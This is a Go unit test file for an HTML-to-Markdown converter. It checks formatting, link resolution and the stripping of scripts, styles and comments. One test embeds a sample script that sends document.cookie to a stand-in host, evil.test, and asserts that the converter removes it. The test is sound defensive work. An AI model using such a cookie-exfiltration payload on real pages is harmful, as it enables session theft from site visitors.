package reader_test

import (
	"strings"
	"testing"

	"github.com/lukaszraczylo/mcp-readitall/internal/reader"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// =============================================================================
// HTMLToMarkdown
// =============================================================================

func TestHTMLToMarkdown_BasicElements(t *testing.T) {
	tests := []struct {
		name   string
		html   string
		domain string
		want   []string // substrings that must all appear in the output, in order
		// optional: substrings that must NOT appear
		notWant []string
	}{
		// ===== GOOD CASES =====
		{
			name: "headings hierarchy",
			html: `<h1>Title</h1><h2>Sub</h2><h3>SubSub</h3>`,
			want: []string{"# Title", "## Sub", "### SubSub"},
		},
		{
			name: "paragraphs and emphasis",
			html: `<p>This is <strong>bold</strong> and <em>italic</em> text.</p>`,
			want: []string{"This is **bold** and _italic_ text."},
		},
		{
			name: "unordered list",
			html: `<ul><li>alpha</li><li>beta</li><li>gamma</li></ul>`,
			want: []string{"- alpha", "- beta", "- gamma"},
		},
		{
			name: "ordered list",
			html: `<ol><li>first</li><li>second</li></ol>`,
			want: []string{"1. first", "2. second"},
		},
		{
			name: "inline code",
			html: `<p>Use <code>fmt.Println</code> to print.</p>`,
			want: []string{"Use `fmt.Println` to print."},
		},
		{
			name: "fenced code block",
			html: `<pre><code class="language-go">package main
func main() {}
</code></pre>`,
			want: []string{"```", "package main", "func main()"},
		},
		{
			name: "table",
			html: `<table><tr><th>Name</th><th>Age</th></tr><tr><td>Alice</td><td>30</td></tr><tr><td>Bob</td><td>25</td></tr></table>`,
			// Cells are right-padded to align columns, so we look for the
			// left-delimited portion (" 30 " / " 25 ") without pinning
			// trailing whitespace.
			want: []string{"| Name", "| Age", "| Alice", "| 30", "| Bob", "| 25"},
		},
		{
			name: "horizontal rule",
			html: `<p>before</p><hr><p>after</p>`,
			want: []string{"before", "---", "after"},
		},

		// ===== RELATIVE URLS =====
		{
			name:   "absolute links stay absolute",
			html:   `<a href="https://other.test/x">other</a>`,
			domain: "https://this.test",
			want:   []string{`[other](https://other.test/x)`},
		},
		{
			name:   "relative link is resolved against domain",
			html:   `<a href="/about">about</a>`,
			domain: "https://this.test",
			want:   []string{`[about](https://this.test/about)`},
		},
		{
			name:   "relative image is resolved",
			html:   `<img src="/logo.png" alt="logo">`,
			domain: "https://this.test",
			want:   []string{`![logo](https://this.test/logo.png)`},
		},
		{
			name:   "no domain leaves relative links alone",
			html:   `<a href="/about">about</a>`,
			domain: "",
			want:   []string{`[about](/about)`},
		},

		// ===== STRIKETHROUGH =====
		{
			name: "strikethrough",
			html: `<p>old <del>removed</del> new</p>`,
			want: []string{"old ~~removed~~ new"},
		},

		// ===== BAD / TRICKY INPUTS =====
		{
			name: "script and style are stripped",
			html: `<p>visible</p><script>alert(1)</script><style>p{}</style><p>also visible</p>`,
			want: []string{"visible", "also visible"},
			notWant: []string{
				"alert(1)",
				"p{}",
			},
		},
		{
			name: "html comments are stripped",
			html: `<p>before</p><!-- a comment --><p>after</p>`,
			want: []string{"before", "after"},
			notWant: []string{
				"a comment",
			},
		},
		{
			name: "nested tags are flattened correctly",
			html: `<div><p>outer <strong>with <em>nested</em> emphasis</strong></p></div>`,
			want: []string{"outer **with _nested_ emphasis**"},
		},

		// ===== EDGE CASES =====
		{
			name: "empty string",
			html: "",
			want: []string{},
		},
		{
			name: "whitespace only",
			html: "   \n\t  ",
			want: []string{},
		},
		{
			name: "plain text without tags",
			html: `just plain text`,
			want: []string{"just plain text"},
		},
		{
			name: "html entities are decoded in text",
			html: `<p>5 &lt; 10 &amp; 10 &gt; 5</p>`,
			// In EscapeModeSmart the library decodes &amp; to & but
			// preserves &lt;/&gt; as entities so the output cannot be
			// interpreted as raw HTML/Markdown by downstream renderers.
			want: []string{"5 &lt; 10 & 10 &gt; 5"},
		},
		{
			name: "deeply nested lists",
			html: `<ul><li>one<ul><li>nested</li></ul></li><li>two</li></ul>`,
			want: []string{"- one", "nested", "- two"},
		},
		{
			name: "self-closing void elements do not break parser",
			html: `<p>line one<br>line two<br><br>line four</p>`,
			want: []string{"line one", "line two", "line four"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			got, err := reader.HTMLToMarkdown(tt.html, tt.domain)
			require.NoError(t, err)

			// Trim trailing whitespace from each want so test data is
			// easier to read; markdown output may add trailing newlines.
			for _, w := range tt.want {
				assert.Contains(t, got, w, "expected substring %q in output:\n%s", w, got)
			}
			for _, nw := range tt.notWant {
				assert.NotContains(t, got, nw, "unexpected substring %q in output:\n%s", nw, got)
			}
		})
	}
}

func TestHTMLToMarkdown_RealisticArticle(t *testing.T) {
	t.Parallel()
	html := `
<!DOCTYPE html>
<html>
<head><title>Sample</title></head>
<body>
  <nav><a href="/home">Home</a></nav>
  <article>
    <h1>How to Test</h1>
    <p>Testing is <strong>important</strong>. See <a href="/docs">the docs</a>.</p>
    <h2>Setup</h2>
    <ol>
      <li>Install Go</li>
      <li>Run <code>go test ./...</code></li>
    </ol>
    <h2>Example</h2>
    <pre><code class="language-go">package main
import "fmt"
func main() { fmt.Println("hi") }
</code></pre>
    <table>
      <tr><th>Input</th><th>Output</th></tr>
      <tr><td>1</td><td>one</td></tr>
    </table>
  </article>
  <footer>Copyright 2026</footer>
</body>
</html>`

	md, err := reader.HTMLToMarkdown(html, "https://example.test/blog")
	require.NoError(t, err)

	// Spot-check the key transformations
	mustContain := []string{
		"# How to Test",
		"Testing is **important**",
		"[the docs](https://example.test/docs)",
		"## Setup",
		"1. Install Go",
		"2. Run `go test ./...`",
		"## Example",
		"```",
		"package main",
		"| Input | Output |",
		"| 1     | one    |",
	}
	for _, s := range mustContain {
		assert.Contains(t, md, s, "missing %q in:\n%s", s, md)
	}
}

func TestHTMLToMarkdown_DoesNotLeakScriptOrStyle(t *testing.T) {
	t.Parallel()
	html := `<p>safe</p>
<script type="text/javascript">
  // secret token: ABCDEFG
  window.location = 'https://evil.test/?x=' + document.cookie;
</script>
<style>body { background: url('http://evil.test/bg.png'); }</style>
<p>also safe</p>`

	md, err := reader.HTMLToMarkdown(html, "")
	require.NoError(t, err)

	// Output should not contain the malicious payload
	assert.NotContains(t, md, "ABCDEFG")
	assert.NotContains(t, md, "evil.test")
	assert.NotContains(t, md, "document.cookie")

	// But it should still contain the visible text
	assert.Contains(t, strings.ToLower(md), "safe")
	assert.Contains(t, strings.ToLower(md), "also safe")
}
